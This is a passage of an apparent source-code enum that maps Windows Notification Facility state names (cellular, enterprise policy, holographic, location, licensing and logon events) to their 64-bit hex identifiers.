        WNF_CELL_SYSTEM_TYPE_CAN1 = 0xd8a0b2ea3bd1875,
        WNF_CELL_UICC_ATR_SLOT0 = 0xd8a0b2ea3be3875,
        WNF_CELL_UICC_ATR_SLOT1 = 0xd8a0b2ea3be4075,
        WNF_CELL_UICC_PIN_STATE_SLOT0 = 0xd8a0b2ea3bec075,
        WNF_CELL_UICC_PIN_STATE_SLOT1 = 0xd8a0b2ea3bec875,
        WNF_CELL_UICC_SIMSEC_SLOT0 = 0xd8a0b2ea3be4875,
        WNF_CELL_UICC_SIMSEC_SLOT1 = 0xd8a0b2ea3be5075,
        WNF_CELL_UICC_STATUS_DETAILS_SLOT0 = 0xd8a0b2ea3be0075,
        WNF_CELL_UICC_STATUS_DETAILS_SLOT1 = 0xd8a0b2ea3be0875,
        WNF_CELL_UICC_STATUS_SLOT0 = 0xd8a0b2ea3bc2875,
        WNF_CELL_UICC_STATUS_SLOT1 = 0xd8a0b2ea3bd2875,
        WNF_CELL_USER_PREFERRED_POWER_STATE_MODEM0 = 0xd8a0b2ea3bc8c75,
        WNF_CELL_UTK_PROACTIVE_CMD = 0xd8a0b2ea3bcf075,
        WNF_CELL_UTK_SETUP_MENU_SLOT0 = 0xd8a0b2ea3bce875,
        WNF_CELL_UTK_SETUP_MENU_SLOT1 = 0xd8a0b2ea3bdd075,
        WNF_CELL_VOICEMAIL_NUMBER_CAN0 = 0xd8a0b2ea3bc7075,
        WNF_CELL_WIFI_CALL_SETTINGS_CAN0 = 0xd8a0b2ea3beb075,
        WNF_CELL_WIFI_CALL_SETTINGS_CAN1 = 0xd8a0b2ea3beb875,
        WNF_CERT_FLUSH_CACHE_STATE = 0x15940b2ea3bc1075,
        WNF_CERT_FLUSH_CACHE_TRIGGER = 0x15940b2ea3bc0875,
        WNF_CFCL_SC_CONFIGURATIONS_ADDED = 0xd85082ea3bc1875,
        WNF_CFCL_SC_CONFIGURATIONS_CHANGED = 0xd85082ea3bc0875,
        WNF_CFCL_SC_CONFIGURATIONS_DELETED = 0xd85082ea3bc1075,
        WNF_CI_SMODE_CHANGE = 0x41c6072ea3bc0875,
        WNF_CLIP_CLIPBOARD_HISTORY_ENABLED_CHANGED = 0x118f022ea3bc2035,
        WNF_CLIP_CLIPBOARD_USERSVC_READY = 0x118f022ea3bc2835,
        WNF_CLIP_CLIPBOARD_USERSVC_STOPPED = 0x118f022ea3bc3035,
        WNF_CLIP_CONTENT_CHANGED = 0x118f022ea3bc0875,
        WNF_CLIP_HISTORY_CHANGED = 0x118f022ea3bc1035,
        WNF_CLIP_ROAMING_CLIPBOARD_ENABLED_CHANGED = 0x118f022ea3bc1835,
        WNF_CNET_CELLULAR_CONNECTIONS_AVAILABLE = 0x1583002ea3bc4875,
        WNF_CNET_DPU_GLOBAL_STATE_NOT_TRACKED = 0x1583002ea3bc3075,
        WNF_CNET_DPU_GLOBAL_STATE_OFF_TRACK = 0x1583002ea3bc1875,
        WNF_CNET_DPU_GLOBAL_STATE_ON_TRACK = 0x1583002ea3bc2075,
        WNF_CNET_DPU_GLOBAL_STATE_OVER_LIMIT = 0x1583002ea3bc1075,
        WNF_CNET_DPU_GLOBAL_STATE_UNDER_TRACK = 0x1583002ea3bc2875,
        WNF_CNET_NON_CELLULAR_CONNECTED = 0x1583002ea3bc6875,
        WNF_CNET_RADIO_ACTIVITY = 0x1583002ea3bc7875,
        WNF_CNET_RADIO_ACTIVITY_OR_NON_CELLULAR_CONNECTED = 0x1583002ea3bc7075,
        WNF_CNET_WIFI_ACTIVITY = 0x1583002ea3bc8075,
        WNF_CONT_RESTORE_FROM_SNAPSHOT_COMPLETE = 0x1588012ea3bc0875,
        WNF_CSC_SERVICE_START = 0x41851d2ea3bc0875,
        WNF_CSHL_COMPOSER_CONTEXT_CHANGED = 0xd8e1d2ea3bc3835,
        WNF_CSHL_COMPOSER_LAUNCH_READY = 0xd8e1d2ea3bc0835,
        WNF_CSHL_COMPOSER_TEARDOWN = 0xd8e1d2ea3bc3035,
        WNF_CSHL_PRODUCT_READY = 0xd8e1d2ea3bc2835,
        WNF_CSHL_SKIP_OOBE_CXH = 0xd8e1d2ea3bc4035,
        WNF_CSHL_UI_AUTOMATION = 0xd8e1d2ea3bc1035,
        WNF_CSHL_VIEWHOSTING_READY = 0xd8e1d2ea3bc2035,
        WNF_CSH_LAUNCH_EXPLORER_REQUESTED = 0x418e1d2ea3bc08f5,
        WNF_CXH_APP_FINISHED = 0x418e162ea3bc1035,
        WNF_CXH_BACK = 0x418e162ea3bc2035,
        WNF_CXH_BACK_STATE = 0x418e162ea3bc1835,
        WNF_CXH_OOBE_APP_READY = 0x418e162ea3bc2875,
        WNF_CXH_WEBAPP_STATUS = 0x418e162ea3bc0835,
        WNF_DBA_DEVICE_ACCESS_CHANGED = 0x41870c29a3bc0875,
        WNF_DEP_OOBE_COMPLETE = 0x41960b29a3bc0c75,
        WNF_DEP_UNINSTALL_DISABLED = 0x41960b29a3bc1475,
        WNF_DEVM_DMWAPPUSHSVC_READY = 0xc900b29a3bc1875,
        WNF_DEVM_MULTIVARIANT_PROVISIONING_SESSIONS = 0xc900b29a3bc3075,
        WNF_DEVM_PROVISIONING_COMPLETE = 0xc900b29a3bc0875,
        WNF_DICT_CONTENT_ADDED = 0x15850729a3bc0875,
        WNF_DICT_PERSONALIZATION_FEEDBACK_SIGNAL = 0x15850729a3bc1075,
        WNF_DISK_SCRUB_REQUIRED = 0xa950729a3bc0875,
        WNF_DMF_MIGRATION_COMPLETE = 0x41800329a3bc1075,
        WNF_DMF_MIGRATION_PROGRESS = 0x41800329a3bc1875,
        WNF_DMF_MIGRATION_STARTED = 0x41800329a3bc0875,
        WNF_DMF_UX_COMPLETE = 0x41800329a3bc2075,
        WNF_DNS_ALL_SERVER_TIMEOUT = 0x41950029a3bc1075,
        WNF_DO_MANAGER_ACTIVE = 0x41c60129a3bc0875,
        WNF_DO_POLICY_CHANGED = 0x41c60129a3bc1075,
        WNF_DSM_DSMAPPINSTALLED = 0x418b1d29a3bc0c75,
        WNF_DSM_DSMAPPREMOVED = 0x418b1d29a3bc1475,
        WNF_DUSM_IS_CELLULAR_BACKGROUND_RESTRICTED = 0xc951b29a3bc1075,
        WNF_DUSM_TASK_TOAST = 0xc951b29a3bc0875,
        WNF_DWM_COMPOSITIONCAPABILITIES = 0x418b1929a3bc2835,
        WNF_DWM_HOLOGRAPHIC_COMPOSITOR_EXCLUSIVE = 0x418b1929a3bc3035,
        WNF_DWM_HOLOGRAPHIC_COMPOSITOR_EXCLUSIVE_LOW_FRAMERATE = 0x418b1929a3bc1035,
        WNF_DWM_HOLOGRAPHIC_COMPOSITOR_HAS_PROTECTED_CONTENT = 0x418b1929a3bc1835,
        WNF_DWM_HOLOGRAPHIC_COMPOSITOR_LOW_FRAMERATE = 0x418b1929a3bc2035,
        WNF_DWM_RUNNING = 0x418b1929a3bc0835,
        WNF_DXGK_ADAPTER_TDR_NOTIFICATION = 0xa811629a3bc0875,
        WNF_DXGK_PATH_FAILED_OR_INVALIDATED = 0xa811629a3bc1075,
        WNF_DX_ADAPTER_START = 0x41c61629a3bc8075,
        WNF_DX_ADAPTER_STOP = 0x41c61629a3bc8875,
        WNF_DX_COLOR_OVERRIDE_STATE_CHANGE = 0x41c61629a3bc9875,
        WNF_DX_COLOR_PROFILE_CHANGE = 0x41c61629a3bc7035,
        WNF_DX_DEVICE_REMOVAL = 0x41c61629a3bc60b5,
        WNF_DX_DISPLAY_COLORIMETRY_DATA_CHANGED = 0x41c61629a3bca075,
        WNF_DX_DISPLAY_CONFIG_CHANGE_NOTIFICATION = 0x41c61629a3bc5835,
        WNF_DX_GPM_TARGET = 0x41c61629a3bc7875,
        WNF_DX_HARDWARE_CONTENT_PROTECTION_TILT_NOTIFICATION = 0x41c61629a3bc4075,
        WNF_DX_INTERNAL_PANEL_DIMENSIONS = 0x41c61629a3bc4875,
        WNF_DX_MODERN_OUTPUTDUPLICATION = 0x41c61629a3bc5035,
        WNF_DX_MODERN_OUTPUTDUPLICATION_CONTEXTS = 0x41c61629a3bc6835,
        WNF_DX_MODE_CHANGE_NOTIFICATION = 0x41c61629a3bc1035,
        WNF_DX_MONITOR_CHANGE_NOTIFICATION = 0x41c61629a3bc2835,
        WNF_DX_NETWORK_DISPLAY_STATE_CHANGE_NOTIFICATION = 0x41c61629a3bc2035,
        WNF_DX_OCCLUSION_CHANGE_NOTIFICATION = 0x41c61629a3bc1835,
        WNF_DX_SDR_WHITE_LEVEL_CHANGED = 0x41c61629a3bc9035,
        WNF_DX_STEREO_CONFIG = 0x41c61629a3bc0c75,
        WNF_DX_VAIL_CHANGE_NOTIFICATION = 0x41c61629a3bca8b5,
        WNF_DX_VIDMM_BUDGETCHANGE_NOTIFICATION = 0x41c61629a3bc3875,
        WNF_DX_VIDMM_TRIM_NOTIFICATION = 0x41c61629a3bc30b5,
        WNF_EAP_APPLICATION_HANDLE = 0x41960f28a3bc0875,
        WNF_EDGE_EXTENSION_AVAILABLE = 0x4810a28a3bc18f5,
        WNF_EDGE_EXTENSION_INSTALLED = 0x4810a28a3bc10f5,
        WNF_EDGE_INPRIVATE_EXTENSION_AVAILABLE = 0x4810a28a3bc20f5,
        WNF_EDGE_LAST_NAVIGATED_HOST = 0x4810a28a3bc08f5,
        WNF_EDP_AAD_REAUTH_REQUIRED = 0x41960a28a3bc3875,
        WNF_EDP_APP_UI_ENTERPRISE_CONTEXT_CHANGED = 0x41960a28a3bc3035,
        WNF_EDP_CLIPBOARD_METADATA_CHANGED = 0x41960a28a3bc2035,
        WNF_EDP_CREDENTIALS_UPDATING = 0x41960a28a3bc7075,
        WNF_EDP_DIALOG_CANCEL = 0x41960a28a3bc2835,
        WNF_EDP_DPL_KEYS_DROPPING = 0x41960a28a3bc5875,
        WNF_EDP_DPL_KEYS_STATE = 0x41960a28a3bc1875,
        WNF_EDP_ENTERPRISE_CONTEXTS_UPDATED = 0x41960a28a3bc4475,
        WNF_EDP_IDENTITY_REVOKED = 0x41960a28a3bc10f5,
        WNF_EDP_MISSING_CREDENTIALS = 0x41960a28a3bc6075,
        WNF_EDP_PROCESS_TLS_INDEX = 0x41960a28a3bc50b5,
        WNF_EDP_PROCESS_UI_ENFORCEMENT = 0x41960a28a3bc4875,
        WNF_EDP_PURGE_APP_LEARNING_EVT = 0x41960a28a3bc6875,
        WNF_EDP_TAGGED_APP_LAUNCHED = 0x41960a28a3bc0835,
        WNF_EDU_PRINTER_POLICY_CHANGED = 0x41930a28a3bc0875,
        WNF_EFS_SERVICE_START = 0x41950828a3bc0875,
        WNF_EFS_SOFTWARE_HIVE_AVAILABLE = 0x41950828a3bc1075,
        WNF_ENTR_ABOVELOCK_POLICY_VALUE_CHANGED = 0x13920028a3bc7875,
        WNF_ENTR_ACCOUNTS_POLICY_VALUE_CHANGED = 0x13920028a3bc3075,
        WNF_ENTR_ALLOWALLTRUSTEDAPPS_POLICY_VALUE_CHANGED = 0x13920028a3bcf875,
        WNF_ENTR_ALLOWAPPLICATIONS_POLICY_VALUE_CHANGED = 0x13920028a3bc8075,
        WNF_ENTR_ALLOWCELLULARDATAROAMING_POLICY_VALUE_CHANGED = 0x13920028a3bd4875,
        WNF_ENTR_ALLOWCELLULARDATA_POLICY_VALUE_CHANGED = 0x13920028a3bd5075,
        WNF_ENTR_ALLOWDEVELOPERUNLOCK_POLICY_VALUE_CHANGED = 0x13920028a3bd1875,
        WNF_ENTR_ALLOWDEVICEHEALTHMONITORING_POLICY_VALUE_CHANGED = 0x13920028a3bda075,
        WNF_ENTR_ALLOWINPUTPANEL_POLICY_VALUE_CHANGED = 0x13920028a3bca875,
        WNF_ENTR_ALLOWMANUALWIFICONFIGURATION_POLICY_VALUE_CHANGED = 0x13920028a3bdb875,
        WNF_ENTR_ALLOWMESSAGESYNC_POLICY_VALUE_CHANGED = 0x13920028a3bd6875,
        WNF_ENTR_ALLOWMESSAGE_MMS_POLICY_VALUE_CHANGED = 0x13920028a3bdd875,
        WNF_ENTR_ALLOWMESSAGE_RCS_POLICY_VALUE_CHANGED = 0x13920028a3bde075,
        WNF_ENTR_ALLOWNONMICROSOFTSIGNEDUPDATE_POLICY_VALUE_CHANGED = 0x13920028a3bd3075,
        WNF_ENTR_ALLOWPROJECTIONFROMPC_POLICY_VALUE_CHANGED = 0x13920028a3be0075,
        WNF_ENTR_ALLOWPROJECTIONTOPC_POLICY_VALUE_CHANGED = 0x13920028a3bdd075,
        WNF_ENTR_ALLOWSET24HOURCLOCK_POLICY_VALUE_CHANGED = 0x13920028a3bdf875,
        WNF_ENTR_ALLOWSHAREDUSERDATA_POLICY_VALUE_CHANGED = 0x13920028a3bd0075,
        WNF_ENTR_ALLOWUPDATESERVICE_POLICY_VALUE_CHANGED = 0x13920028a3bd2075,
        WNF_ENTR_ALLOWWIFIDIRECT_POLICY_VALUE_CHANGED = 0x13920028a3bdc875,
        WNF_ENTR_ALLOWWIFI_POLICY_VALUE_CHANGED = 0x13920028a3bdb075,
        WNF_ENTR_ALLOW_WBA_EXECUTION_POLICY_VALUE_CHANGED = 0x13920028a3bd3875,
        WNF_ENTR_APPHVSI_CACHED_POLICY_VALUE_CHANGED = 0x13920028a3bd8475,
        WNF_ENTR_APPHVSI_POLICY_VALUE_CHANGED = 0x13920028a3bdf075,
        WNF_ENTR_APPLICATIONMANAGEMENT_POLICY_VALUE_CHANGED = 0x13920028a3bc5875,
        WNF_ENTR_APPPRIVACY_POLICY_VALUE_CHANGED = 0x13920028a3be1875,
        WNF_ENTR_BITS_POLICY_VALUE_CHANGED = 0x13920028a3be6875,
        WNF_ENTR_BLUETOOTH_POLICY_VALUE_CHANGED = 0x13920028a3bcd875,
        WNF_ENTR_BROWSER_POLICY_VALUE_CHANGED = 0x13920028a3bc4075,
        WNF_ENTR_CAMERA_POLICY_VALUE_CHANGED = 0x13920028a3bc5075,
        WNF_ENTR_CONNECTIVITY_POLICY_VALUE_CHANGED = 0x13920028a3bc2075,
        WNF_ENTR_CONTEXT_STATE_CHANGE = 0x13920028a3bc9875,
        WNF_ENTR_DEVICELOCK_POLICY_VALUE_CHANGED = 0x13920028a3bc0875,
        WNF_ENTR_DISABLEADVERTISINGID_POLICY_VALUE_CHANGED = 0x13920028a3bd7075,
        WNF_ENTR_DOMAIN_NAMES_FOR_EMAIL_SYNC_POLICY_VALUE_CHANGED = 0x13920028a3bd4075,
        WNF_ENTR_EDPENFORCEMENTLEVEL_CACHED_POLICY_VALUE_CHANGED = 0x13920028a3bd5c75,
        WNF_ENTR_EDPENFORCEMENTLEVEL_POLICY_VALUE_CHANGED = 0x13920028a3bc8875,
        WNF_ENTR_EDPNETWORKING_POLICY_VALUE_CHANGED = 0x13920028a3bce075,
        WNF_ENTR_EDPSHOWICONS_CACHED_POLICY_VALUE_CHANGED = 0x13920028a3bd9c75,
        WNF_ENTR_EDPSMB_POLICY_VALUE_CHANGED = 0x13920028a3bde875,
        WNF_ENTR_EMOJI_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be5075,
        WNF_ENTR_ENABLETOUCHKEYBOARDAUTOINVOKE_POLICY_VALUE_CHANGED = 0x13920028a3be2075,
        WNF_ENTR_EVALUATE_APPHVSI_CONFIGURATION_STATE = 0x13920028a3bd9075,
        WNF_ENTR_EVALUATE_EDP_CONFIGURATION_STATE = 0x13920028a3bd7875,
        WNF_ENTR_EXPERIENCE_POLICY_VALUE_CHANGED = 0x13920028a3bc2875,
        WNF_ENTR_EXPLOITGUARD_POLICY_VALUE_CHANGED = 0x13920028a3be0875,
        WNF_ENTR_FORCEDOCKED_TOUCHKEYBOARD_POLICY_VALUE_CHANGED = 0x13920028a3be5875,
        WNF_ENTR_FULLLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be2875,
        WNF_ENTR_HANDWRITING_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be4075,
        WNF_ENTR_NARROWLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be3875,
        WNF_ENTR_NETWORKISOLATION_POLICY_VALUE_CHANGED = 0x13920028a3bd8875,
        WNF_ENTR_PROTECTEDDOMAINNAMES_CACHED_POLICY_VALUE_CHANGED = 0x13920028a3bd6475,
        WNF_ENTR_PUSH_NOTIFICATION_RECEIVED = 0x13920028a3bc6875,
        WNF_ENTR_PUSH_RECEIVED = 0x13920028a3bca075,
        WNF_ENTR_REMOVABLEDISK_DENY_WRITE_POLICY_VALUE_CHANGED = 0x13920028a3be7075,
        WNF_ENTR_REQUIRE_DEVICE_ENCRYPTION_POLICY_VALUE_CHANGED = 0x13920028a3bc6075,
        WNF_ENTR_REQUIRE_DPL_POLICY_VALUE_CHANGED = 0x13920028a3bce875,
        WNF_ENTR_RESTRICTAPPDATATOSYTEMVOLUME_POLICY_VALUE_CHANGED = 0x13920028a3bd1075,
        WNF_ENTR_RESTRICTAPPTOSYTEMVOLUME_POLICY_VALUE_CHANGED = 0x13920028a3bd0875,
        WNF_ENTR_SEARCH_ALLOW_INDEXER = 0x13920028a3bdc075,
        WNF_ENTR_SEARCH_ALLOW_INDEXING_ENCRYPTED_STORES_OR_ITEMS = 0x13920028a3bcd075,
        WNF_ENTR_SEARCH_ALLOW_USING_DIACRITICS = 0x13920028a3bcb075,
        WNF_ENTR_SEARCH_ALWAYS_USE_AUTO_LANG_DETECTION = 0x13920028a3bcb875,
        WNF_ENTR_SEARCH_DISABLE_REMOVABLE_DRIVE_INDEXING = 0x13920028a3bcc075,
        WNF_ENTR_SEARCH_POLICY_VALUE_CHANGED = 0x13920028a3bc7075,
        WNF_ENTR_SEARCH_PREVENT_INDEXING_LOW_DISK_SPACE_MB = 0x13920028a3bcc875,
        WNF_ENTR_SECURITY_POLICY_VALUE_CHANGED = 0x13920028a3bc3875,
        WNF_ENTR_SPLITLAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be4875,
        WNF_ENTR_SYSTEM_POLICY_VALUE_CHANGED = 0x13920028a3bc1875,
        WNF_ENTR_TOUCHKEYBOARDDICTATION_POLICY_VALUE_CHANGED = 0x13920028a3be6075,
        WNF_ENTR_UPDATESERVICEURL_POLICY_VALUE_CHANGED = 0x13920028a3bd2875,
        WNF_ENTR_UPDATE_POLICY_VALUE_CHANGED = 0x13920028a3bc4875,
        WNF_ENTR_WAP_MESSAGE_FOR_DMWAPPUSHSVC_READY = 0x13920028a3bc9075,
        WNF_ENTR_WIDELAYOUT_AVAILABILITY_POLICY_VALUE_CHANGED = 0x13920028a3be3075,
        WNF_ENTR_WIFI_POLICY_VALUE_CHANGED = 0x13920028a3bc1075,
        WNF_ENTR_WINDOWSDEFENDERSECURITYCENTER_POLICY_VALUE_CHANGED = 0x13920028a3be1075,
        WNF_ENTR_WINDOWS_DEFENDER_POLICY_VALUE_CHANGED = 0x13920028a3bcf075,
        WNF_EOA_ATMANAGER_ATS_STARTED = 0x41870128a3bc2035,
        WNF_EOA_NARRATOR_FOCUS_CHANGE = 0x41870128a3bc08f5,
        WNF_EOA_NARRATOR_KEYBOARD_REMAP = 0x41870128a3bc2875,
        WNF_EOA_NARRATOR_RUNNING = 0x41870128a3bc1075,
        WNF_EOA_UISETTINGS_CHANGED = 0x41870128a3bc1875,
        WNF_ETW_SUBSYSTEM_INITIALIZED = 0x41911a28a3bc0875,
        WNF_EXEC_OSTASKCOMPLETION_REVOKED = 0x2831628a3bc0875,
        WNF_EXEC_THERMAL_LIMITER_CLOSE_APPLICATION_VIEWS = 0x2831628a3bc1875,
        WNF_EXEC_THERMAL_LIMITER_DISPLAY_WARNING = 0x2831628a3bc2875,
        WNF_EXEC_THERMAL_LIMITER_STOP_MRC = 0x2831628a3bc3075,
        WNF_EXEC_THERMAL_LIMITER_TERMINATE_BACKGROUND_TASKS = 0x2831628a3bc2075,
        WNF_FDBK_QUESTION_NOTIFICATION = 0xa840a2ba3bc0875,
        WNF_FLTN_WNF_ARRIVED = 0xf92022ba3bc0875,
        WNF_FLT_RUNDOWN_WAIT = 0x4192022ba3bc0875,
        WNF_FLYT_IDS_CHANGED = 0x159f022ba3bc0875,
        WNF_FOD_STATE_CHANGE = 0x4182012ba3bc0875,
        WNF_FSRL_OPLOCK_BREAK = 0xd941d2ba3bc1075,
        WNF_FSRL_TIERED_VOLUME_DETECTED = 0xd941d2ba3bc0875,
        WNF_FVE_BDESVC_TRIGGER_START = 0x4183182ba3bc3075,
        WNF_FVE_BITLOCKER_ENCRYPT_ALL_DRIVES = 0x4183182ba3bc6875,
        WNF_FVE_DETASK_SYNC_PROVISIONING_COMPLETE = 0x4183182ba3bc7075,
        WNF_FVE_DETASK_TRIGGER_START = 0x4183182ba3bc6075,
        WNF_FVE_DE_MANAGED_VOLUMES_COUNT = 0x4183182ba3bc1075,
        WNF_FVE_DE_SUPPORT = 0x4183182ba3bc0875,
        WNF_FVE_MDM_POLICY_REFRESH = 0x4183182ba3bc4075,
        WNF_FVE_REQUIRE_SDCARD_ENCRYPTION = 0x4183182ba3bc4875,
        WNF_FVE_SDCARD_ENCRYPTION_REQUEST = 0x4183182ba3bc5075,
        WNF_FVE_SDCARD_ENCRYPTION_STATUS = 0x4183182ba3bc5875,
        WNF_FVE_STATE_CHANGE = 0x4183182ba3bc3875,
        WNF_FVE_WIM_HASH_DELETION_TRIGGER = 0x4183182ba3bc2875,
        WNF_FVE_WIM_HASH_GENERATION_COMPLETION = 0x4183182ba3bc2075,
        WNF_FVE_WIM_HASH_GENERATION_TRIGGER = 0x4183182ba3bc1875,
        WNF_GC_INITIAL_PRESENT = 0x41c60d2aa3bc0875,
        WNF_GIP_ADAPTER_CHANGE = 0x4196072aa3bc0875,
        WNF_GLOB_USERPROFILE_LANGLIST_CHANGED = 0x389022aa3bc0875,
        WNF_GPOL_SYSTEM_CHANGES = 0xd891e2aa3bc0875,
        WNF_GPOL_USER_CHANGES = 0xd891e2aa3bc10f5,
        WNF_HAM_SYSTEM_STATE_CHANGED = 0x418b0f25a3bc0875,
        WNF_HAS_VERIFY_HEALTH_CERT = 0x41950f25a3bc0875,
        WNF_HOLO_CAPTURE_STATE = 0xe8a0125a3bcc035,
        WNF_HOLO_DISPLAY_QUALITY_LEVEL = 0xe8a0125a3bc7835,
        WNF_HOLO_ENVIRONMENT_AUDIO_ASSET = 0xe8a0125a3bc5075,
        WNF_HOLO_FORCE_ROOM_BOUNDARY = 0xe8a0125a3bc2835,
        WNF_HOLO_INPUT_FOCUS_CHANGE = 0xe8a0125a3bc2075,
        WNF_HOLO_PROJECTION_REQUEST = 0xe8a0125a3bcb835,
        WNF_HOLO_REQUEST_HMD_USE_STATE = 0xe8a0125a3bc9035,
        WNF_HOLO_REQUEST_HOLOGRAPHIC_ACTIVATION_REALM = 0xe8a0125a3bc9835,
        WNF_HOLO_RESET_IDLE_TIMER = 0xe8a0125a3bca035,
        WNF_HOLO_RETAIL_DEMO_TIMER = 0xe8a0125a3bc7035,
        WNF_HOLO_ROOM_BOUNDARY_DATA_CHANGED = 0xe8a0125a3bc3835,
        WNF_HOLO_ROOM_BOUNDARY_VISIBILITY = 0xe8a0125a3bc4035,
        WNF_HOLO_SET_SHELL_SPAWN_POINT = 0xe8a0125a3bc6835,
        WNF_HOLO_SHARING_SESSION_CONTEXT = 0xe8a0125a3bcb035,
        WNF_HOLO_SHELL_INPUT_3DSWITCH_DISABLE = 0xe8a0125a3bc4835,
        WNF_HOLO_SHELL_STATE = 0xe8a0125a3bc1835,
        WNF_HOLO_SHELL_STATE_INTERACTIVE_USER = 0xe8a0125a3bca875,
        WNF_HOLO_STREAMING_STATE = 0xe8a0125a3bc3035,
        WNF_HOLO_SYSTEM_DISPLAY_CONTEXT_CHANGE = 0xe8a0125a3bc8875,
        WNF_HOLO_UNINSTALL_COMPLETE = 0xe8a0125a3bc6075,
        WNF_HOLO_UNINSTALL_PREPARE = 0xe8a0125a3bc5875,
        WNF_HOLO_UNINSTALL_PREPARE_COMPLETE = 0xe8a0125a3bc8075,
        WNF_HOLO_USER_DISPLAY_CONTEXT = 0xe8a0125a3bc0835,
        WNF_HOLO_USER_INPUT_CONTEXT = 0xe8a0125a3bc1035,
        WNF_HVL_CPU_MGMT_PARTITION = 0x418a1825a3bc0875,
        WNF_HYPV_HOST_WMI_EVENT_PROVIDER_STATE = 0x17961725a3bc1075,
        WNF_HYPV_HOST_WMI_OBJECT_PROVIDER_STATE = 0x17961725a3bc0875,
        WNF_IME_AUTOMATIC_PRIVATE_MODE = 0x41830324a3bc1835,
        WNF_IME_EXPLICIT_PRIVATE_MODE = 0x41830324a3bc1035,
        WNF_IME_INPUT_MODE_LABEL = 0x41830324a3bc0875,
        WNF_IME_INPUT_SWITCH_NOTIFY = 0x41830324a3bc2035,
        WNF_IMSN_GLOBALLIGHTSINVALIDATED = 0xf950324a3bc4835,
        WNF_IMSN_IMMERSIVEMONITORCHANGED = 0xf950324a3bc1835,
        WNF_IMSN_KILL_LOGICAL_FOCUS = 0xf950324a3bc3035,
        WNF_IMSN_LAUNCHERVISIBILITY = 0xf950324a3bc1035,
        WNF_IMSN_MONITORMODECHANGED = 0xf950324a3bc0835,
        WNF_IMSN_PROJECTIONDISPLAYAVAILABLE = 0xf950324a3bc3835,
        WNF_IMSN_TRANSPARENCYPOLICY = 0xf950324a3bc4035,
        WNF_IMS_PUSH_NOTIFICATION_RECEIVED = 0x41950324a3bc0875,
        WNF_IOT_EMBEDDED_MODE_POLICY_VALUE_CHANGED = 0x41920124a3bc0875,
        WNF_IOT_STARTUP_SETTINGS_CHANGED = 0x41920124a3bc1075,
        WNF_ISM_CURSOR_MANAGER_READY = 0x418b1d24a3bc1835,
        WNF_ISM_GAMECONTROLLER_ZEPHYRUS_FAULT = 0x418b1d24a3bc2075,
        WNF_ISM_INPUT_UPDATE_AFTER_TRACK_INTERVAL = 0x418b1d24a3bc1035,
        WNF_ISM_LAST_USER_ACTIVITY = 0x418b1d24a3bc0835,
        WNF_IUIS_SCALE_CHANGED = 0x128f1b24a3bc0835,
        WNF_KSV_CAMERAPRIVACY = 0x41901d26a3bc2875,
        WNF_KSV_DEVICESTATE = 0x41901d26a3bc1075,
        WNF_KSV_FSSTREAMACTIVITY = 0x41901d26a3bc1875,
        WNF_KSV_KSSTREAMACTIVITY = 0x41901d26a3bc2075,
        WNF_KSV_STREAMSTATE = 0x41901d26a3bc0875,
        WNF_LANG_FOD_INSTALLATION_STARTED = 0x6880f21a3bc0875,
        WNF_LED_SETTINGSCHANGED = 0x41820b21a3bc0875,
        WNF_LFS_ACTION_DIALOG_AVAILABLE = 0x41950821a3bc4875,
        WNF_LFS_CLIENT_RECALCULATE_PERMISSIONS = 0x41950821a3bc3875,
        WNF_LFS_GEOFENCETRACKING_STATE = 0x41950821a3bc2075,
        WNF_LFS_LOCATION_MDM_AREA_POLICY_CHANGED = 0x41950821a3bc6075,
        WNF_LFS_LOCATION_MDM_POLICY_ENABLELOCATION_CHANGED = 0x41950821a3bc6875,
        WNF_LFS_MASTERSWITCH_STATE = 0x41950821a3bc1875,
        WNF_LFS_PERMISSION_TO_SHOW_ICON_CHANGED = 0x41950821a3bc4075,
        WNF_LFS_POSITION_AVAILABLE = 0x41950821a3bc3075,
        WNF_LFS_RESERVED_WNF_EVENT_2 = 0x41950821a3bc2875,
        WNF_LFS_RUNNING_STATE = 0x41950821a3bc1075,
        WNF_LFS_SIGNIFICANT_LOCATION_EVENT = 0x41950821a3bc5075,
        WNF_LFS_STATE = 0x41950821a3bc0875,
        WNF_LFS_VISITS_SIGNIFICANT_LOCATION_EVENT = 0x41950821a3bc5875,
        WNF_LIC_DEVICE_LICENSE_MISSING = 0x41850721a3bc3075,
        WNF_LIC_DEVICE_LICENSE_REMOVED = 0x41850721a3bc2875,
        WNF_LIC_DEVICE_LICENSE_UPDATED = 0x41850721a3bc2075,
        WNF_LIC_HARDWAREID_IN_DEVICE_LICENSE_IN_TOLERANCE = 0x41850721a3bc1875,
        WNF_LIC_HARDWAREID_IN_DEVICE_LICENSE_OUT_OF_TOLERANCE = 0x41850721a3bc1075,
        WNF_LIC_INT_DEVICE_LICENSE_EXPIRED = 0x41850721a3bc3875,
        WNF_LIC_LOCAL_MIGRATED_LICENSES_FOUND = 0x41850721a3bc4075,
        WNF_LIC_MANAGE_DEVICE_REGISTRATION_AND_REACTIVATION = 0x41850721a3bc4875,
        WNF_LIC_NO_APPLICABLE_LICENSES_FOUND = 0x41850721a3bc0875,
        WNF_LM_APP_LICENSE_EVENT = 0x41c60321a3bc2875,
        WNF_LM_CONTENT_LICENSE_CHANGED = 0x41c60321a3bc1075,
        WNF_LM_LICENSE_REFRESHED = 0x41c60321a3bc3875,
        WNF_LM_OFFLINE_PC_CHANGED = 0x41c60321a3bc3075,
        WNF_LM_OPTIONAL_PACKAGE_SUSPEND_REQUIRED = 0x41c60321a3bc2075,
        WNF_LM_PACKAGE_SUSPEND_REQUIRED = 0x41c60321a3bc0875,
        WNF_LM_ROOT_LICENSE_CHANGED = 0x41c60321a3bc1875,
        WNF_LOC_DEVICE_BROKER_ACCESS_CHANGED = 0x41850121a3bc0875,
        WNF_LOC_RESERVED_WNF_EVENT = 0x41850121a3bc1075,
        WNF_LOC_SHOW_SYSTRAY = 0x41850121a3bc1875,
        WNF_LOGN_BIO_ENROLLMENT_APP_INSTANCE_CHANGED = 0xf810121a3bc4075,
        WNF_LOGN_CREDENTIAL_TILE_SELECTION_CHANGED = 0xf810121a3bc3075,
        WNF_LOGN_EOA_FLYOUT_POSITION = 0xf810121a3bc0835,
        WNF_LOGN_LOCAL_SIGNON = 0xf810121a3bc2875,
        WNF_LOGN_PINPAD_VISIBLE = 0xf810121a3bc2035,
